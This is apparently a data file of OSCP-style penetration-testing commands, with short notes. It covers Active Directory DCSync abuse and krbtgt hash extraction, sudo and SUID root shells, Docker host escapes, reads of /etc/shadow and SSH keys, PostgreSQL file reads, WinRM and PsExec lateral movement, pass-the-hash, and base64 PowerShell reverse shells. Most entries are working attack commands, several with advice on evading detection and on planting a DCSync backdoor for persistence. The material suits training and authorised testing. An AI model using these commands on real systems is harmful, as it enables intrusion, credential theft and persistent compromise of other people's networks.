adfind.exe -b 'DC=corp,DC=com' -s base nTSecurityDescriptor -resolvesids
# Parse output for Replication-Get-Changes ACEs

Check current user's DCSync rights:
$user = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
$userSID = ([System.Security.Principal.WindowsIdentity]::GetCurrent()).User.Value
Get-ObjectAcl -DistinguishedName 'DC=corp,DC=com' -ResolveGUIDs | Where-Object {$_.SecurityIdentifier -eq $userSID -and $_.ObjectAceType -match 'Replication'}

DCSYNC REQUIRED RIGHTS:

Minimum rights for DCSync:
1. DS-Replication-Get-Changes (GUID: 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2)
2. DS-Replication-Get-Changes-All (GUID: 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2)
3. DS-Replication-Get-Changes-In-Filtered-Set (GUID: 89e95b76-444d-4c62-991a-0facbeda640c) - optional

Check for all three:
Get-ObjectAcl -DistinguishedName 'DC=corp,DC=com' -ResolveGUIDs | Where-Object {($_.ObjectAceType -eq 'DS-Replication-Get-Changes' -or $_.ObjectAceType -eq 'DS-Replication-Get-Changes-All') -and $_.ActiveDirectoryRights -match 'ExtendedRight'} | Select-Object SecurityIdentifier,ObjectAceType | Sort-Object SecurityIdentifier

DEFAULT ACCOUNTS WITH DCSYNC:

1. Domain Admins (SID: S-1-5-21-<domain>-512)
2. Enterprise Admins (SID: S-1-5-21-<root_domain>-519)
3. Administrators (SID: S-1-5-32-544)
4. Domain Controllers (SID: S-1-5-21-<domain>-516)

Verify defaults:
Get-ADGroupMember 'Domain Admins' | Select-Object Name,SID
Get-ADGroupMember 'Enterprise Admins' | Select-Object Name,SID

COMMON MISCONFIGURATIONS:

1. Exchange Servers:
# Exchange Write DACL often grants DCSync
Get-ObjectAcl -DistinguishedName 'DC=corp,DC=com' | Where-Object {$_.SecurityIdentifier -like '*Exchange*'}

2. Backup operators:
# Backup software given replication rights
Get-ObjectAcl -DistinguishedName 'DC=corp,DC=com' | Where-Object {$_.SecurityIdentifier -like '*backup*' -and $_.ObjectAceType -match 'Replication'}

3. Service accounts:
# Custom service accounts with excessive permissions
Get-ObjectAcl -DistinguishedName 'DC=corp,DC=com' -ResolveGUIDs | Where-Object {$_.ObjectAceType -match 'Replication' -and $_.SecurityIdentifier -notlike '*-512' -and $_.SecurityIdentifier -notlike '*-519'}

PRIVILEGE ESCALATION PATH:

1. Compromise low-privileged user
2. Check DCSync rights: Get-ObjectAcl...
3. If user/group has DCSync → Extract credentials:
impacket-secretsdump -just-dc-user krbtgt 'corp.com/compromised_user:password@192.168.50.70'
4. Create Golden Ticket with krbtgt hash
5. Achieve domain-wide persistence

GRANT DCSYNC RIGHTS (for persistence):

# Grant DCSync to specific user (requires DA):
Add-DomainObjectAcl -TargetIdentity 'DC=corp,DC=com' -PrincipalIdentity backdoor_user -Rights DCSync -Verbose

# Remove DCSync rights:
Remove-DomainObjectAcl -TargetIdentity 'DC=corp,DC=com' -PrincipalIdentity backdoor_user -Rights DCSync

BLOODHOUND INTEGRATION:

Collect ACL data:
Invoke-BloodHound -CollectionMethod ACL,ObjectProps

BloodHound Cypher query (find DCSync paths):
MATCH p=(u:User)-[:MemberOf*1..]->(g:Group)-[:GenericAll|WriteDacl]->(d:Domain) RETURN p

Find users with direct DCSync:
MATCH (u)-[:DCSync]->(d:Domain) RETURN u.name, d.name

DETECTION:

- Monitor Event ID 4662 (operation performed on object)
  - Object Type: {19195a5b-6da0-11d0-afd3-00c04fd930c9} (domainDNS)
  - Properties: {1131f6aa...} (DS-Replication-Get-Changes)
- Alert on DCSync from non-DC computers
- Baseline normal replication sources (only DCs should replicate)
- Monitor ACL changes on domain root:
  - Event ID 5136 (directory service object modified)
  - Attribute: nTSecurityDescriptor

MITIGATION:

- Regularly audit DCSync privileges: Get-ObjectAcl...
- Remove unnecessary DCSync grants
- Use Protected Users group (prevents credential delegation)
- Implement tiered administration (separate DA for each task)
- Monitor replication traffic from non-DCs
- Enable Advanced Threat Analytics (ATA) for DCSync detection

TIME ESTIMATE:
Privilege enumeration: 5-15 seconds
SID resolution: 2-5 seconds per SID
Total: 10-30 seconds","medium"
"ps-search-desktop-flags","PowerShell Search Desktop for Flags","POST_EXPLOIT","Get-Content C:\Users\<USERNAME>\Desktop\*.txt","One-liner commands to locate and retrieve OSCP-style flags on Windows desktop directories","FLAG_RETRIEVAL","",""
"check-sudo-privs","Check Sudo Privileges","post-exploit","sudo -l","List commands current user can run with sudo. First step in sudo privilege escalation.","linux-sudo","ALWAYS run this first before SUID enumeration.

Takes <5 seconds vs 2+ minutes for SUID scan.

NOPASSWD entries are instant root with no exploitation complexity.","high"
"analyze-sudoers","Analyze Sudoers Configuration","post-exploit","echo 'Manual analysis step: Review sudo -l output for exploitable configurations'","Identify exploitable sudo configurations: (1) NOPASSWD entries, (2) GTFOBins binaries, (3) Wildcards, (4) env_keep=LD_PRELOAD","linux-sudo","Key exploitable patterns:
(1) find, vim, nmap, less, more - spawn shells, (2) python, perl, ruby, awk - execute commands, (3) base64, xxd, od - read files, (4) env_keep+=LD_PRELOAD - shared library injection","high"
"gtfobins-sudo-lookup","GTFOBins Sudo Technique Lookup","post-exploit","echo 'Visit: https://gtfobins.github.io/ and search for binary name. Navigate to Sudo section.'","Manual step: Lookup sudo exploitation technique for discovered binary on GTFOBins website","linux-sudo","Common GTFOBins sudo techniques:
(1) Shell spawning:
sudo find .

-exec /bin/bash \; -quit, (2) Command execution:
sudo python -c 'import os; os.system(""/bin/bash"")', (3) File reading:
sudo base64 /etc/shadow | base64 -d","high"
"execute-sudo-exploit","Execute Sudo Exploitation","post-exploit","sudo <SUDO_BINARY> <EXPLOIT_FLAGS>","Template command for sudo exploitation. Replace <SUDO_BINARY> with binary from parser (find, vim, python, etc.) and <EXPLOIT_FLAGS> with GTFOBins technique","linux-sudo","Common exploits:
(1) sudo find .

-exec /bin/bash \; -quit, (2) sudo vim -c ':!/bin/bash', (3) sudo less /etc/profile (then !bash), (4) sudo python -c 'import os; os.system(""/bin/bash"")', (5) sudo nmap --interactive (then !sh)","high"
"sudo-exploit-find","Sudo Find Exploitation","post-exploit","sudo find . -exec /bin/bash \; -quit","Exploit sudo find to spawn root bash shell via -exec flag","linux-sudo","Find is one of the most common OSCP sudo quick wins.

Appears in ~30% of OSCP-style privilege escalation scenarios.

Alternative paths:
sudo find /etc -name 'passwd' -exec /bin/bash \;","high"
"sudo-exploit-vim","Sudo Vim Exploitation","post-exploit","sudo vim -c ':!/bin/bash'","Exploit sudo vim to spawn root shell via command execution","linux-sudo","Vim is extremely common in OSCP environments.

Also check:
vi, nano, emacs, pico - all have similar exploitation techniques via shell execution or command execution","high"
"sudo-exploit-python","Sudo Python Exploitation","post-exploit","sudo python -c 'import os; os.system(""/bin/bash"")'","Exploit sudo python to spawn root shell via os.system()","linux-sudo","Python is very common in web application servers (www-data user).

Also works with:
perl, ruby, node, php - all have command execution capabilities.

Perl:
sudo perl -e 'exec ""/bin/bash"";'","high"
"sudo-exploit-less","Sudo Less Exploitation","post-exploit","sudo less /etc/profile","Exploit sudo less pager to spawn root shell via interactive command execution (press !bash after less opens)","linux-sudo","Less/more/man are common OSCP vectors.

Steps:
(1) sudo less <file>, (2) Wait for pager to open, (3) Type:
!bash, (4) Press Enter, (5) Root shell spawned.

Also works with:
!/bin/bash, !sh, !/bin/sh","high"
"sudo-exploit-nmap","Sudo Nmap Exploitation (Legacy Interactive Mode)","post-exploit","sudo nmap --interactive","Exploit sudo nmap (versions 2.02-5.21) interactive mode to spawn root shell. Only works on old nmap versions.","linux-sudo","Nmap interactive mode is rare in modern OSCP labs (most use nmap 7.x).

More likely to find:
python, vim, find, less, more.

Keep as alternative for legacy systems or HTB retired machines.","medium"
"verify-root-access-sudo","Verify Root Privileges Obtained","post-exploit","whoami && id && cat /etc/shadow > /dev/null 2>&1 && echo 'Root verified' || echo 'Not root'","Confirm effective UID is 0 (root) and can access root-only files. Critical verification step before claiming privilege escalation success.","linux-sudo","OSCP exam requirement:
Take screenshot showing (1) whoami output, (2) id output, (3) contents of proof.txt flag.

Document exact command sequence for report.

Sudo escalation is considered 'clean' privilege escalation (no kernel exploits or crashes).","high"
"ps-search-credentials","PowerShell Search Files for Credentials","POST_EXPLOIT","Get-ChildItem -Path <SEARCH_PATH> -Include <PATTERNS> -Recurse -ErrorAction SilentlyContinue | Select-String -Pattern <KEYWORD>","One-liner commands to search Windows filesystem for credential-containing files","CREDENTIAL_HARVESTING","",""
"check-docker-group","Check Docker Group Membership","post-exploit","groups && id","Verify current user is in docker group (prerequisite for docker escape)","docker-escape","Docker group membership = root-equivalent access.

If user is in docker group, privilege escalation is trivial.","high"
"check-docker-socket","Check Docker Socket Access","post-exploit","ls -la /var/run/docker.sock && docker ps 2>/dev/null","Verify access to Docker socket and test if docker commands work","docker-escape","Socket access confirms docker group membership is effective.

Even if no containers are running, docker commands working means escalation is possible.","high"
"list-docker-images","List Available Docker Images","post-exploit","docker images","Enumerate available Docker images for container escape","docker-escape","If no images available, can pull alpine (smallest):
docker pull alpine.

However, may be noisy/logged.

Prefer using existing images.","high"
"docker-mount-escape","Docker Mount Escape to Root","post-exploit","docker run -v /:/mnt --rm -it <IMAGE_NAME> chroot /mnt sh","Mount host filesystem in container and chroot to gain root access","docker-escape","This is the cleanest Docker escape method.

Host filesystem is at /mnt.

All host files accessible as root.

Can read /mnt/root/.ssh/id_rsa, /mnt/etc/shadow, modify /mnt/etc/passwd, etc.","high"
"verify-docker-root","Verify Root Access to Host","post-exploit","cat /mnt/etc/shadow && ls -la /mnt/root && cat /mnt/root/.ssh/id_rsa 2>/dev/null","Confirm full root access to host filesystem from container","docker-escape","Once verified, you have complete control over host.

Can read any file, modify any file, plant backdoors, extract all credentials.","high"
"docker-privileged-escape","Docker Privileged Container Escape","post-exploit","docker run --privileged -it <IMAGE_NAME> sh","Alternative Docker escape using privileged mode (more dangerous/noisy)","docker-escape","Privileged mode is more powerful but noisier than mount escape.

Prefer docker-mount-escape for cleaner approach.","medium"
"docker-socket-mount","Docker Socket Mount Abuse","post-exploit","docker run -v /var/run/docker.sock:/var/run/docker.sock -it <IMAGE_NAME> sh","Mount Docker socket inside container to control host Docker daemon","docker-escape","Requires image with docker client installed.

More complex than direct mount escape.

Mainly useful if mount escape is blocked.","medium"
"docker-pull-alpine","Pull Alpine Docker Image","post-exploit","docker pull alpine","Download Alpine Linux image (smallest, fastest) for container escape","docker-escape","May be logged/detected.

Prefer using existing images if available.

Alpine is only 5MB so downloads fast even on slow connections.","medium"
"find-suid-binaries","Find SUID Binaries","post-exploit","find / -perm -4000 -type f 2>/dev/null","Locate all SUID binaries on filesystem (setuid bit allows execution with owner privileges)","linux-suid","SUID bit allows file to execute with owner's privileges (usually root).

Misconfigured SUID binaries are common OSCP privilege escalation vector.","high"
"filter-suid-binaries","Filter Interesting SUID Binaries","post-exploit","find / -perm -4000 -type f 2>/dev/null | grep -vE '(passwd|sudo|pkexec|polkit|mount|umount|su|ping|ping6|fusermount|newgrp|chsh|chfn|gpasswd)'","Filter out standard system SUID binaries and identify potentially exploitable ones","linux-suid","Standard system binaries (passwd, sudo, su) are SUID by design and rarely exploitable.

Focus on:
find, vim, nmap, base64, less, more, python, perl, awk, tar, zip, gzip.","high"
"gtfobins-suid-lookup","GTFOBins SUID Technique Lookup","post-exploit","echo 'Visit: https://gtfobins.github.io/ and search for binary name. Look for SUID section.'","Manual step: Lookup exploitation technique for discovered SUID binary on GTFOBins website","linux-suid","GTFOBins is curated list of Unix binaries that can be exploited for privilege escalation.

SUID section shows commands that work when binary has setuid bit set.

Example:
/usr/bin/find .

-exec /bin/bash -p \; -quit","high"
"execute-suid-exploit-find","Execute SUID Exploitation (find example)","post-exploit","/usr/bin/find . -exec /bin/bash -p \; -quit","Exploit SUID find binary to spawn privileged bash shell","linux-suid","The -p flag is CRITICAL for bash to preserve elevated permissions.

Without it, bash drops privileges.

Other common SUID exploits:
vim -c ':!/bin/bash -p', nmap --interactive then !sh, base64 /etc/shadow | base64 -d","high"
"verify-root-access-suid","Verify Root Privileges Obtained","post-exploit","whoami && id && cat /etc/shadow > /dev/null 2>&1 && echo 'Root verified' || echo 'Not root'","Confirm effective UID is 0 (root) and can access root-only files","linux-suid","Effective UID (euid) is what matters for permissions.

Even if real UID (uid) is not 0, euid=0 grants root privileges.

OSCP exam:
Take screenshot of whoami, id, and proof.txt contents for documentation.","high"
"ssh-login-password","SSH Login with Password","exploitation","sshpass -p '<PASSWORD>' ssh <USERNAME>@<TARGET> -p <PORT>","Non-interactive SSH login using password (automated credential testing)","lateral-movement","sshpass enables non-interactive SSH for scripts.

Dangerous in production (password visible in process list).

Time estimate:
10 seconds.

OSCP tips:
(1) Common credential reuse:
database passwords work for SSH.

(2) Test discovered users:
root, admin, user, www-data.

(3) For exam documentation, prefer manual SSH (interactive) for screenshots.

(4) Use -o options for exam targets:
-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null.

(5) Alternative for scripting:
use SSH keys instead of sshpass.","high"
"postgres-direct-connect","PostgreSQL Direct Connection","exploitation","psql -h <TARGET> -U <USERNAME> -d <DATABASE>","Establish direct connection to PostgreSQL database using psql client with extracted credentials","database","Password will be prompted interactively unless specified.

For automation/scripting:
PGPASSWORD='<PASSWORD>' psql -h <TARGET> -U <USERNAME> -d <DATABASE>.

Alternative non-interactive:
echo '<PASSWORD>' | psql -h <TARGET> -U <USERNAME> -d <DATABASE>.

Port can be specified with -p <PORT> if not default 5432.

After connection, use \du to list users, \l to list databases, \dt to list tables.

OSCP TIP:
If SQLi extraction revealed credentials but web shell failed, direct database connection often bypasses network restrictions (PostgreSQL port 5432 may be selectively allowed).

Time estimate:
2-5 minutes for connection and verification.

Document connection success in breakthrough.md.","high"
"postgres-privilege-check","PostgreSQL Superuser Privilege Check","exploitation","SELECT current_user, usesuper FROM pg_user WHERE usename = current_user;","Verify if connected database user has superuser privileges (required for pg_read_file and pg_ls_dir functions)","database","Superuser (usesuper=t) privileges enable powerful capabilities:
(1) Read arbitrary files with pg_read_file('/path/to/file'), (2) List directories with pg_ls_dir('/path/'), (3) Execute OS commands with COPY FROM PROGRAM (PostgreSQL 9.3+), (4) Read pg_shadow table (contains password hashes), (5) Modify postgresql.conf settings.

Non-superuser (usesuper=f) is restricted to:
SELECT on granted tables, cannot read files, cannot execute system commands.

OSCP TIP:
Many PostgreSQL installations use 'postgres' superuser with weak/default password.

If current user is not superuser, enumerate other users with:
SELECT usename,usesuper,valuntil FROM pg_user; Document privilege status immediately in investigation_checklist.md - determines entire exploitation path.

Time estimate:
1 minute.","high"
"postgres-file-enum","PostgreSQL Directory Listing","exploitation","SELECT pg_ls_dir('<DIRECTORY>');","List directory contents using PostgreSQL built-in pg_ls_dir() function (requires superuser)","database","Common directories to enumerate (priority order for OSCP):
(1) /var/www - web server files (often accessible), (2) /tmp - world-writable (always readable), (3) /home - user directories (rarely accessible), (4) /opt - custom applications, (5) /root - root home (usually denied), (6) / - filesystem root (overview).

Postgres user (uid=106 typically) permissions:
CAN read world-readable files and directories postgres owns or is in group, CANNOT read protected directories like /root, /etc/shadow, user home directories.

Advanced:
Combine with string_agg() for compact output:
SELECT string_agg(pg_ls_dir('/var/www'), ', '); OSCP WORKFLOW:
Start at /, identify promising directories, drill down systematically.

Document directory structure in investigation_checklist.md.

Time estimate:
5-10 minutes for thorough enumeration.","high"
"postgres-file-read","PostgreSQL File Read","exploitation","SELECT pg_read_file('<FILE_PATH>');","Read file contents using PostgreSQL built-in pg_read_file() function (requires superuser and file read permissions)","database","Full syntax:
pg_read_file(filename [, offset, length [, missing_ok]]).

Examples:
(1) Read entire file:
SELECT pg_read_file('/etc/passwd'); (2) Read first 100 bytes:
SELECT pg_read_file('/var/log/app.log', 0, 100); (3) Read middle chunk:
SELECT pg_read_file('/file', 500, 200); (4) Ignore missing:
SELECT pg_read_file('/maybe/not/here', 0, 1000, true); File access permissions:
Postgres user (uid=106) can read:
world-readable files (chmod 644), files in /var/www (if postgres in www-data group), /tmp files.

CANNOT read:
/root/*, /home/user/.ssh/*, /etc/shadow.

Common OSCP targets:
/var/www/flag.txt, /var/www/html/config.php, /home/user/local.txt, /root/proof.txt (rarely accessible), ~/.ssh/id_rsa (if accessible).

Alternative for command execution:
COPY (SELECT '') TO PROGRAM 'cat /etc/passwd' but often hangs due to process restrictions.

Time estimate:
2-5 minutes once file located.

CAPTURE FLAG IMMEDIATELY - take screenshot, save output to breakthrough.md.","high"
"winrm-enter-pssession","WinRM - Enter-PSSession Interactive","active-directory","$password = ConvertTo-SecureString '<PASS>' -AsPlainText -Force; $credential = New-Object System.Management.Automation.PSCredential('<USER>', $password); Enter-PSSession -ComputerName <TARGET> -Credential $credential","Establish interactive PowerShell remoting session using Enter-PSSession (native Windows PowerShell)","lateral-movement","OSCP TRAINING MATERIAL - POWERSHELL REMOTING (ENTER-PSSESSION):
TRAINING WORKFLOW:
From OSCP module, PowerShell remoting demonstrated with session creation:
1.

Create PSCredential object (ConvertTo-SecureString + New-Object PSCredential)

2.

New-PSSession -ComputerName 192.168.50.73 -Credential $credential (creates session)

3.

Enter-PSSession 1 (connects to session ID 1 interactively)

4.

Commands execute remotely, verified with whoami/hostname showing FILES04

WHAT IS POWERSHELL REMOTING:
Microsoft's official remote administration protocol called ""PowerShell remoting"" - built-in WinRM capability accessed through PowerShell cmdlets.

Invoked via Enter-PSSession for interactive access.

PROTOCOL:
WinRM over WS-Management:
- Port 5985:
HTTP (plain HTTP traffic)
- Port 5986:
HTTPS (encrypted SSL/TLS traffic)
- Based on WS-Management open standard

GROUP MEMBERSHIP REQUIREMENT (CRITICAL):
User must be member of:
- Administrators group (default), OR
- Remote Management Users group

on the target machine.

PSCREDENTIAL OBJECT CREATION (REQUIRED):
Training shows three-step process:
  $username = 'jen'
  $password = 'Nexus123!'
  $secureString = ConvertTo-SecureString $password -AsPlaintext -Force
  $credential = New-Object System.Management.Automation.PSCredential $username, $secureString

This pattern is reusable across WMI, WinRM, and other PowerShell remote operations.

INTERACTIVE SESSION BEHAVIOR:
- Prompt changes to [TARGET]:
PS C:\Users\username>
- All commands execute in remote PowerShell context
- Current directory, environment variables are REMOTE system's
- Exit-PSSession returns to local prompt
- Session persists after disconnection (can reconnect with Enter-PSSession)

COMPARISON - ENTER-PSSESSION VS NEW-PSSESSION:
- Enter-PSSession:
  Interactive (like SSH), single target, manual command entry

- New-PSSession:
  Creates session object for programmatic use with Invoke-Command

- Both use WinRM, same port requirements, same authentication

LOGGING & DETECTION:
- Event ID 4624:
Logon event (Type 3:
Network logon)
- Event ID 4688:
Process creation (PowerShell.exe)
- WinRM event logs:
Microsoft-Windows-WinRM/Operational
- PowerShell script block logging (if enabled)
- MORE VISIBLE than WMI/DCOM - creates legitimate admin session logs

WHOAMI BEHAVIOR:
Training notes whoami shows remote user identity correctly (corp\jen on FILES04), confirming remote execution context.

Time:
2-3 minutes (PSCredential creation + session establishment + verification)

EXAM STRATEGY:
Most stable and feature-rich Windows→Windows lateral movement.

Use when you control Windows attack box and want interactive access.

For automation, use Invoke-Command or New-PSSession.","high"
"winrm-new-pssession","WinRM - New-PSSession Reusable Session","active-directory","$password = ConvertTo-SecureString '<PASS>' -AsPlainText -Force; $credential = New-Object System.Management.Automation.PSCredential('<USER>', $password); $session = New-PSSession -ComputerName <TARGET> -Credential $credential; Invoke-Command -Session $session -ScriptBlock {<COMMAND>}","Create persistent reusable PowerShell remoting session with New-PSSession for multiple command execution","lateral-movement","EDUCATIONAL CONTEXT:
New-PSSession creates persistent session object for efficient multi-command execution.

WHY PERSISTENT:
Avoids re-authentication overhead for each command - session remains open until explicitly removed.

ADVANTAGES OVER ENTER-PSSESSION:
- Non-blocking (can run commands in background)
- Supports parallel execution on multiple targets
- Better for automation

USE CASE:
Batch automation - execute multiple scripts without reconnecting.

PERFORMANCE:
- First command slower (session creation)
- Subsequent commands faster (reuse)

SESSION MANAGEMENT:
- View sessions:
Get-PSSession
- Remove session:
Remove-PSSession $session
- Timeout:
Default idle timeout 4 hours (configurable with -SessionOption)

PARALLEL EXECUTION:
Create array of sessions, use Invoke-Command -Session $sessions -Parallel.

Time:
2-3 minutes for setup, <1 minute per subsequent command

EXAM TIP:
Use for scripted enumeration across multiple targets.","high"
"winrm-invoke-command","WinRM - Invoke-Command One-Shot Execution","active-directory","$password = ConvertTo-SecureString '<PASS>' -AsPlainText -Force; $credential = New-Object System.Management.Automation.PSCredential('<USER>', $password); Invoke-Command -ComputerName <TARGET> -Credential $credential -ScriptBlock {<COMMAND>}","Execute single PowerShell command remotely without persistent session using Invoke-Command","lateral-movement","EDUCATIONAL CONTEXT:
Invoke-Command is PowerShell's most versatile remote execution method - supports one-shot and persistent sessions.

WHY ONE-SHOT:
Quick command execution without session management overhead.

WHEN TO USE:
- Single command
- Quick enumeration
- Testing connectivity

COMPARISON:
- Faster for single command than Enter-PSSession (no interactive overhead)
- Slower for multiple commands than New-PSSession (no session reuse)

MULTIPLE TARGETS:
Supports parallel execution:
  Invoke-Command -ComputerName @('target1','target2','target3') -ScriptBlock {whoami}

SCRIPT EXECUTION:
Use -FilePath to execute local script on remote system:
  Invoke-Command -FilePath .\script.ps1 -ComputerName <TARGET> -Credential $credential

OUTPUT HANDLING:
Results include PSComputerName property for multi-target tracking.

ALTERNATIVE SYNTAX:
Shorter form:
  Invoke-Command -ComputerName <TARGET> {<COMMAND>} -Credential $credential

Time:
1-2 minutes per command

EXAM TIP:
Best for quick enumeration, use New-PSSession for sustained access.","high"
"winrm-winrs","WinRM - Legacy winrs.exe Command","active-directory","winrs -r:<TARGET> -u:<USER> -p:<PASS> <COMMAND>","Execute commands remotely using legacy winrs.exe utility (Windows Remote Shell)","lateral-movement","OSCP TRAINING MATERIAL - WINRS (WINDOWS REMOTE SHELL):
TRAINING EXAMPLE:
From OSCP module, jen's credentials used to execute commands remotely on FILES04:
  winrs -r:files04 -u:jen -p:Nexus123! ""cmd /c hostname & whoami""

EXPECTED OUTPUT:
  FILES04
  corp\jen

WHAT IS WINRS:
Windows Remote Shell - command-line WinRM client pre-dating PowerShell remoting.

Built into all modern Windows systems.

Alternative to PsExec/WMI when PowerShell unavailable.

PROTOCOL:
WinRM over WS-Management:
- Port 5986:
Encrypted HTTPS traffic
- Port 5985:
Plain HTTP
- Microsoft's implementation of WS-Management protocol

GROUP MEMBERSHIP REQUIREMENT (CRITICAL):
For winRS to work, domain user must be part of:
- Administrators group (local admin rights), OR
- Remote Management Users group on target host

This is explicitly stated in training:
""For WinRS to work, the domain user needs to be part of the Administrators or Remote Management Users group on the target host.""

REVERSE SHELL DEPLOYMENT:
Training shows replacing commands with base64-encoded PowerShell reverse shell:
  winrs -r:files04 -u:jen -p:Nexus123! ""powershell -nop -w hidden -e JABjAGwAaQBlAG4A...""

This spawned reverse shell to Netcat listener on Kali (port 443), achieving lateral movement.

LIMITATIONS VS POWERSHELL REMOTING:
- cmd.exe commands only (unless invoking powershell.exe)
- No interactive persistent session
- No tab completion or command history
- Less sophisticated than Enter-PSSession

COMMAND EXECUTION SYNTAX:
- Use ""cmd /c"" prefix for multiple commands:
  winrs -r:files04 ""cmd /c hostname & whoami""

- Quote entire command string
- Commands execute in cmd.exe context, NOT PowerShell

WHEN TO USE IN OSCP:
- PowerShell remoting blocked/restricted
- Quick one-off command execution
- Older Windows systems (pre-PowerShell 2.0)
- Compatibility with cmd.exe-based tools

Time:
<1 minute per command execution

EXAM STRATEGY:
Prefer PowerShell remoting (Enter-PSSession/Invoke-Command) for better functionality.

Use winrs as fallback when PowerShell restricted.","medium"
"evil-winrm-creds","Evil-WinRM - Password Authentication","active-directory","evil-winrm -i <TARGET> -u <USER> -p '<PASS>'","Establish interactive PowerShell remoting from Kali using Evil-WinRM with password authentication","lateral-movement","EDUCATIONAL CONTEXT:
Evil-WinRM is Ruby-based WinRM client for Kali - preferred tool for Windows lateral movement from Linux.

WHY EVIL-WINRM:
- Built-in file upload/download
- PowerShell script loading
- Executable management
- Tab completion
- Command history

ADVANTAGES:
- Native feel (PowerShell prompt)
- Upload/download commands
- Menu system (help menu)

FILE OPERATIONS:
  upload /kali/path C:\Windows\Temp\file.exe
  download C:\Users\user\file.txt /kali/path

SCRIPT LOADING:
Use -s /path/to/scripts to auto-load PowerShell scripts:
  evil-winrm -i <TARGET> -u <USER> -p '<PASS>' -s /opt/powershell

Scripts accessible with script_name (no .ps1 extension).

EXECUTABLE MENU:
Use -e /path/to/exes for pre-loaded binaries:
  evil-winrm -i <TARGET> -u <USER> -p '<PASS>' -e /opt/binaries

Run with Invoke-Binary.

STEALTH:
Creates standard WinRM logs (Event ID 4624, 4688) - same as legitimate admin access.

COMPARISON:
More features than Invoke-Command, easier than PSExec from Kali.

Time:
1-2 minutes for connection

EXAM TIP:
First choice for Kali → Windows lateral movement, most stable and feature-rich.

COMMON LOCATIONS:
Default Kali install, or:
  gem install evil-winrm","high"
"evil-winrm-hash","Evil-WinRM - Pass-the-Hash","active-directory","evil-winrm -i <TARGET> -u <USER> -H <NTLM_HASH>","Authenticate to WinRM using NTLM hash instead of password (pass-the-hash attack)","lateral-movement","EDUCATIONAL CONTEXT:
Pass-the-hash allows authentication with NTLM hash without knowing plaintext password - critical for lateral movement.

WHY THIS WORKS:
Windows NTLM authentication accepts hash directly - password never needed if you have hash.

HASH EXTRACTION:
Obtain hashes with:
- secretsdump.py (Impacket)
- mimikatz (lsadump::sam)
- crackmapexec --sam

HASH FORMAT:
Only need NTLM portion (32 hex chars), LM hash optional:
- If both available:
  -H LM:NTLM

- If NTLM only:
  -H :NTLM_HASH
  OR
  -H NTLM_HASH

STEALTH:
Creates same logs as password authentication - hash usage not visible in logs.

PERSISTENCE:
Hash remains valid until password changed - can reuse for multiple sessions.

LATERAL MOVEMENT:
Same hash works across all machines where account is local admin (local accounts) or domain member (domain accounts).

Time:
1-2 minutes (same as password auth)

EXAM TIP:
Critical technique after dumping SAM/NTDS - enables lateral movement without password cracking.","high"
"test-wsman","WinRM - Test-WSMan Verification","active-directory","Test-WSMan -ComputerName <TARGET>","Verify WinRM service is accessible and responding on target before attempting authentication","lateral-movement","EDUCATIONAL CONTEXT:
Test-WSMan performs unauthenticated connectivity test to WinRM service - quick way to verify WinRM availability before attempting authentication.

WHY TEST FIRST:
Avoids failed authentication attempts, validates port accessibility, identifies protocol version.

WHAT IT CHECKS:
WinRM service responding, protocol version supported, product version (Windows OS).

NO CREDENTIALS:
Basic test requires no authentication - checks if service is listening.

PORTS:
Default HTTP on 5985, HTTPS on 5986 (use -UseSSL).

VERBOSE OUTPUT:
Returns XML identifying service details (wsmid, ProtocolVersion, ProductVendor).

ALTERNATIVE TEST:
From Kali use nmap -p 5985,5986 or crackmapexec winrm <TARGET> (shows WINRM in banner).

TIME ESTIMATE:
<30 seconds.

EXAM TIP:
Quick check before attempting lateral movement - confirms WinRM available.","medium"
"winrm-revshell-invoke","WinRM - PowerShell Reverse Shell via Invoke-Command","active-directory","$password = ConvertTo-SecureString '<PASS>' -AsPlainText -Force; $credential = New-Object System.Management.Automation.PSCredential('<USER>', $password); Invoke-Command -ComputerName <TARGET> -Credential $credential -ScriptBlock {powershell -nop -w hidden -e <BASE64_PAYLOAD>}","Deploy base64-encoded PowerShell reverse shell through WinRM for callback to attacker","lateral-movement","EDUCATIONAL CONTEXT:
Combines WinRM lateral movement with PowerShell reverse shell for full interactive callback.

WHY BASE64:
Avoids escaping issues with special characters in PowerShell one-liner, bypasses some basic AV signature detection.

HOW TO GENERATE PAYLOAD:
Use base64-encode-powershell command or:
$bytes = [System.Text.Encoding]::Unicode.GetBytes($payload); $encoded = [Convert]::ToBase64String($bytes).

WHAT HAPPENS:
Invoke-Command executes 'powershell -e' on target → target decodes base64 → executes reverse shell → connects back to LHOST:LPORT.

STEALTH CONSIDERATIONS:
-w hidden prevents visible window, -nop avoids profile scripts, base64 bypasses simple string detection.

LOGGING:
Creates WinRM event logs (Event ID 4624, 4688) and PowerShell script block logging if enabled.

MANUAL DECODE TEST:
[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('<BASE64>')) to verify payload.

ALTERNATIVES:
Use Evil-WinRM to upload nc.exe or other reverse shell binary.

TIME ESTIMATE:
3-5 minutes including payload generation and listener setup.

EXAM TIP:
Pre-generate base64 payloads before exam for common LHOST/LPORT combinations.","high"
"psexec-impacket-shell","PSExec - Impacket Interactive Shell","active-directory","impacket-psexec <DOMAIN>/<USER>:<PASS>@<TARGET>","Execute Impacket PSExec from Kali to gain SYSTEM-level interactive shell on remote Windows via SMB","lateral-movement","EDUCATIONAL CONTEXT:
PSExec is classic lateral movement technique providing SYSTEM-level shell immediately.

WHY THIS WORKS:
Uploads binary to ADMIN$ share, creates Windows service, executes payload as SYSTEM.

HOW IT WORKS:
1) Connects to IPC$ share, 2) Uploads RemCom.exe to ADMIN$ share, 3) Creates/starts service via SCM, 4) Service executes RemCom.exe as SYSTEM, 5) Spawns cmd.exe shell.

ADVANTAGES:
Spawns SYSTEM shell (highest privilege), most reliable for OSCP, well-documented.

DISADVANTAGES:
Writes binary to disk (forensics), creates service (event logs), easier to detect than WMI/DCOM.

MANUAL ALTERNATIVE:
Microsoft PsExec64.exe from Sysinternals (see psexec-sysinternals).

UAC LIMITATION:
2014 Microsoft patch blocks local admin PTH for non-RID-500 accounts (domain users unaffected).

CLEANUP:
PSExec automatically cleans up service and binary on exit.

BEHIND THE SCENES:
Service creation generates Event ID 7045, authentication creates 4624, process creation 4688.

TIME ESTIMATE:
1-2 minutes for connection establishment.

EXAM TIP:
First lateral movement technique to try when credentials available - most stable and straightforward.","high"
